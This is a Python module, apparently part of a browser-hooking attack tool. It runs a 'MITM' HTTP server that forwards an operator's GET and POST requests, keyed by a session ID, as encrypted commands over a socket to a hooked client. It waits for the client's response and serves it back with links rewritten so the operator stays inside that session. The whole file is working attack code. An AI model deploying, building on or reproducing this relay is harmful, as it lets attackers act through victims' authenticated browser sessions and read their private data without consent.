import asyncio
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import socksUtil
import cryptoUtil
import datetime

import config

cache = {}
mod = None

class MITMHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        asyncio.run(self.performRequest('GET'))

    def do_POST(self):
        asyncio.run(self.performRequest('POST'))

    async def performRequest(self, method):

        if "favicon" in self.path:
            return
        args = [a for a in self.path.split('/') if a]
        if not args:
            self.send_response(404)
            self.end_headers()
            return
            
        sid = args[0] # SID is now the first part of the path
        path = 'base_url'
        if len(args) > 1:
            path = "/".join(args[1:]) # rest of the path
        
        # no devolver el script del websocket para no crear nuevas conexiones
        if "websocket.js" in str(path).lower():
            return
        print(f"MITM Request for SID {sid}: {path}")
        response = {}
        cacheKey = str(datetime.datetime.now())
        
        # Construye el objeto de la request
        request = {
            "Command": "mitm",
            "method": method,
            "url": path,
            "key": cacheKey
        }
        
        # Si es POST incluye el body
        if method == 'POST':
            request['body'] = self.rfile.read(
                int(self.headers["Content-Length"])).decode("utf-8")
        try:
            socket = socksUtil.getSocketBySid(sid)
            if not socket:
                raise Exception(f"No socket found for SID {sid}")
                
            await cryptoUtil.sendSecretMessage(socket, json.dumps(request))
            while cacheKey not in cache:
                await asyncio.sleep(0.01) # Use sleep instead of busy-wait
            response = cache[cacheKey]
            self.send_response(200)
            self.send_header("Content-type", response["type"])
        except  Exception as e:
            response["content"] = f'{method} Request error for SID {sid}: {e}'
            self.send_response(404)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        # Rewrite links to keep the SID in the path
        content = response["content"]
        if isinstance(content, str):
            content = content.replace('href=\"/', f'href=\"/{sid}/')
            self.wfile.write(content.encode("utf-8"))
        elif isinstance(content, bytes):
            # For binary content, we don't rewrite
            self.wfile.write(content)
        cache.pop(cacheKey, None)

    def log_message(self, format: str, *args) -> None:
        return ""


def start_server(module):
    global mod
    mod = module
    server_address = (config.MITM_HOST, config.MITM_PORT)
    httpd = HTTPServer(server_address, MITMHTTPRequestHandler)
    print(f"MITM server running at http://{config.MITM_HOST}:{config.MITM_PORT}/")
    httpd.serve_forever()
